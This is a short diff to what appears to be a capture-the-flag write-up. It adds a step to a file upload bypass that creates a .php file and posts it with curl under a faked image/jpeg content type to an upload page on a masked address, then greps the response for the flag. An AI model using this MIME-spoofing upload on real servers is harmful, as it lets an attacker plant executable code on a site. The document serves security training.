@@ -1,5 +1,6 @@
 - How -
 Use CURL to change the the type of the uploaded file. You can also use addons such as tamper data.
+touch /tmp/lol.php
 curl -s -X POST -F "uploaded=@/tmp/lol.php;type=image/jpeg" -F "Upload=true" "http://xxx.xxx.xxx.xxx?page=upload" | grep "flag"
 
 - What is it -
